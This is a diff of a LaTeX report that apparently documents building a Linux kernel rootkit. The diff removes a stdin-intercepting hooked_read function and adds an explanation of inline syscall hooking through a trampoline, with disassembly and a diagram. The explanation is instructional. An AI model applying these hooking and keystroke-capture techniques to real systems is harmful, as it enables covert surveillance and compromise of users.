@@ -450,13 +450,13 @@ To do so, we inject some custom instructions into the original machine code for 
       \draw [->] (2,1.25) .. controls +(.5,0) and +(-.5,0) .. (f.west);
     \end{tikzpicture}
   }
-  \subfigure[After hooking. Syscall table stays untouched, but code of \texttt{sys\_read} is modified, so \texttt{sys\_read} itself redirects call to \texttt{hooked\_read}.]{
+  \subfigure[After hooking. Syscall table stays untouched, but code of \texttt{sys\_read} is modified, so \texttt{sys\_read} itself redirects call to \texttt{hooked\_read}. Note that the address of the modified \texttt{sys\_read} is the same as the address for the original \texttt{sys\_read}]{
     \begin{tikzpicture}
       \draw (0,-0.5) rectangle (2,2.5);
       \node at (1,2.5) [above] {System call table};
       \draw (0,1) rectangle (2,1.5);
       \node (p) at (1,1) [above] {\texttt{0xc10ae026}};
-      \node at (5,2.3) [above] {Original \texttt{sys\_read}};
+      \node at (5,2.3) [above] {Modified \texttt{sys\_read}};
       \tikzstyle {memorycell} = [shape=rectangle, draw=black, minimum width=4cm, text width=4cm, minimum height=0.65cm];
       \node (f) [memorycell] at  (5,2) {\texttt{jmp \$0xbadc0ded}};
       \node (f1) [memorycell] at (5,1.35) {\texttt{[...]}};
@@ -531,36 +531,68 @@ _memcpy( sys_call_table[__NR_read], new_syscall_code, sizeof(syscall_code), 1);
 
 Now that we've installed the hook properly, we can think about how the new hooked function works. In principle, it works like the old \texttt{hooked\_read}: It calls the original \texttt{sys\_read}, checks its return values\footnote{It doesn't actually check return value only, but the (potentially modified) arguments.}, does some processing, and returns the value received from the original \texttt{sys\_read}.
 
-The only problem arising here is that the original \texttt{sys\_read} isn't original anymore! We modified it such that it automatically jumps to \texttt{hooked\_read}. Therefore, we have to do some work: 
+The only problem arising here is that the original \texttt{sys\_read} isn't original anymore! We modified it such that it automatically jumps to \texttt{hooked\_read}. Therefore, we have to do some work when initializing the hook: As said before, we manipulate the first 5 bytes of \texttt{sys\_read} and create a backup of them. We moreover will use these five bytes to ``simulate'' the original run of the \texttt{sys\_read} function.
 
-\begin{itemize}
-\item \texttt{hooked\_read} first restores the original \texttt{sys\_read} function, so it can be called as if it weren't changed anytime.
-\item Then, the original function is called.
-\item Afterwards, the hook is installed back again, i.e. the (now really) original \texttt{sys\_read} is modified such that it jumps to \texttt{hooked\_read}.
-\item At last, the result is returned.
-\end{itemize}
-
-The following code does all this:
+Let us for now concentrate on how the \texttt{sys\_read} normally takes place on assembly level. Therefore, we consider again some disassembly for the \texttt{read} system call:
 
 \begin{verbatim}
-asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
-    void** sys_call_table = (void *) ptr_sys_call_table;
-    ssize_t retval;
-    OUR_TRY_MODULE_GET;
-    printk(KERN_INFO "This is the hooked read!\n");
-    _memcpy(sys_call_table[SYSCALL_NR], syscall_code, sizeof(syscall_code), 1);
-    retval = ((asmlinkage ssize_t (*)(unsigned int, char __user*, size_t))
-             sys_call_table[SYSCALL_NR])(fd, buf, count);
-    if (retval > 0 && fd == 0){ // we read something from stdin
-        handle_input(buf, retval);
-    }
-    _memcpy(sys_call_table[SYSCALL_NR], new_syscall_code, sizeof(syscall_code), 1);
-    OUR_MODULE_PUT;
-    return retval;
-}
+0xc10ae026:	push   %esi                 ;; gets overwritten
+0xc10ae027:	mov    $0xfffffff7,%esi     ;; gets overwritten
+0xc10ae02c:	push   %ebx
+0xc10ae02d:	sub    $0xc,%esp
 \end{verbatim}
 
-Note the two occurences of \texttt{\_memcpy} that are responsible for backing up and restoring the original \texttt{read} system call.
+When we overwrite the first 5 bytes with the jump-instruction to \texttt{hooked\_read}, this affects the first two instructions of the original \texttt{read} system call (\texttt{push \%esi} and \texttt{mov \$0xfffffff7,\%esi}). These two instructions require 7 bytes of memory. Thus, if we want to backup the first 2 instructions (not only the first 5 bytes), we can do something like follows:
+
+\begin{verbatim}
+    _memcpy( trampoline, sys_call_table[SYSCALL_NR], 7, 0);
+\end{verbatim}
+
+This copies the first 2 instructions into an auxiliary byte array \texttt{trampoline}. That is, we have now the following situation:
+
+\begin{itemize}
+\item When the read system call gets called, we are redirected to \texttt{hooked\_read}.
+\item \texttt{trampoline} stores the first 2 \emph{original} instructions of the \emph{original} system call.
+\end{itemize}
+
+As said above, \texttt{hooked\_read} somehow needs to call the original system call so that we get the result (and -- of course -- the user doesn't experience any difference when typing in something). However, the system call is currently damaged since we overwrote the first 2 instructions in memory.
+
+But we can do the following: Since we have the first 2 \emph{original} instructions stored in \texttt{trampoline}, we can just ``go there'', do these two instructions, and afterwards jump to the third instruction of the original system call and continue there. This technique is illustrated in \autoref{fig:trampoline-hooked-read}.
+
+\begin{figure}[t]
+  \centering
+  \begin{tikzpicture}
+    %% system call table
+    \draw (0,0) rectangle (2,3);
+    \node at (1,3) [above] {System call table};
+    \draw (0,1) rectangle (2,1.5);
+    \node (p) at (1,1) [above] {\texttt{0x15bf102a}};
+    %% modified sys_read
+    \tikzstyle {memorycell} = [shape=rectangle, draw=black, minimum width=4cm, text width=4cm, minimum height=0.65cm];
+    \node at (5,3.3) [above] {Modified \texttt{sys\_read}};
+    \node (sr1) [memorycell] at (5,3) {\texttt{jmp   \$0xbadc0ded}};
+    \node (sr2) [memorycell] at (5,2.35) {\texttt{[unimportant]}};
+    \node (sr3) [memorycell] at (5,1.7) {\texttt{push \%ebx}};
+    \node (sr4) [memorycell] at (5,1.05) {\texttt{sub \$0xc,\%esp}};
+    \draw [->] (2,1.25) .. controls +(0.5,0) and +(-0.5,0) .. (sr1.west);
+    %% hooked_read
+    \tikzstyle {memorycell} = [shape=rectangle, draw=black, minimum width=4cm, minimum height=0.65cm];
+    \node (hr) [memorycell] at (10,3.5) {\texttt{hooked\_read}};
+    \draw [->] (sr1.east) .. controls +(.5,0) and +(-.5,0) .. (hr.west);
+    %% trampoline
+    \tikzstyle {memorycell} = [shape=rectangle, draw=black, minimum width=4cm, text width=4cm, minimum height=0.65cm];
+    \node at (10,1.8) [above] {\texttt{trampoline}};
+    \node (t1) [memorycell] at (10,1.5) {\texttt{push \%esi}};
+    \node (t2) [memorycell] at (10,0.85) {\texttt{mov \$0xfffffff7,\%esi}};
+    \node (t3) [memorycell] at (10,0.2) {\texttt{push \%esi}};
+    \draw [->] (t3.west) .. controls +(-.5,0) and +(.5,0) .. (sr3.east);
+    \draw [->, rounded corners] (hr.east) -- +(.5,0) |- (t1.east);
+  \end{tikzpicture}
+  \caption{Mechanism of \texttt{hooked\_socketcall} in connection with \texttt{trampoline}. The modified \texttt{sys\_read} ensures that we jump to the rootkit's \texttt{hooked\_read} function, which -- for its part -- ``issues a call'' to trampoline that contains the first 2 instructions of the original \texttt{sys\_read} functions and a jump the third instruction in \texttt{sys\_read}.}
+  \label{fig:trampoline-hooked-read}
+\end{figure}
+
+
 
 \subsection{Hiding sockets from \texttt{ss} another way}
 \label{sec:socket-hiding-evasion}
